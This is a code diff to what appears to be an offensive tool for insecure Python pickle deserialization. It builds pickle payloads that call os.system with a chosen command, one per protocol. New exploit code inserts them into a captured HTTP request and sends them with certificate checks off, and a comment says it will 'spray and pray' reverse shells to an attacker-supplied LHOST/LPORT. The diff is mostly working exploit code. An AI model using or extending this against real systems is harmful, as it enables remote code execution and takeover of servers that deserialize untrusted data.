@@ -141,7 +141,8 @@ def verify() -> bool:
 
 
 def generate_payload(supplied_cmd:str = None) -> list[str]: # todo: nadodati na postojeci pickle objekt
-    print("[+] Using generate-payload module")
+
+    if supplied_cmd is None: print("[+] Using generate-payload module")
 
     cmd = None
 
@@ -163,8 +164,7 @@ def generate_payload(supplied_cmd:str = None) -> list[str]: # todo: nadodati na 
             return os.system, (self.command,)
         
         
-
-    print("[+] Generating payloads ... \n")
+    if supplied_cmd is None: print("[+] Generating payloads ... \n")
     payloads_list = []
 
     for prot_num in range (pickle.HIGHEST_PROTOCOL + 1):
@@ -295,6 +295,18 @@ def confirm_vuln():
 def exploit():
     print("[+] Using exploit module")
 
+
+    request = read_file(g_args.request)
+
+    proxy_servers = None
+    if g_args.proxy is not None:
+        proxy_servers = {
+            'http': g_args.proxy,
+            'https': g_args.proxy,
+        }
+
+
+    # spray and pray a bunch of revshells
     if g_args.revshell:    
         revshell_ip = input("[+] Enter your ip(LHOST): ")
         revshell_port = input("[+] Enter you (LPORT): ")
@@ -316,11 +328,26 @@ def exploit():
             cmd = g_args.cmd
         else:
             cmd = input("[+] Enter your command: ")
+        
+        payloads_list = generate_payload(cmd)
+
+        print(f"[+] Sending requests with payload: {cmd}")
+        for num, payload in enumerate(payloads_list):
+            (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
+            req = Request(method=method, url=url, headers=headers, data=data)
+            prepared_req = req.prepare()
+            if proxy_servers is not None:
+                response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+            else:
+                response = requests.Session().send(prepared_req, verify=False)
+            
+            print(f"[+] Sent request num #{num + 1} ")
+
+        
+        print_green("[+] Done")
+
+
     
-
-    #TODO:  picklat, ubacit u request, poslat, ispisat da je poslano
-
-
 
 
 
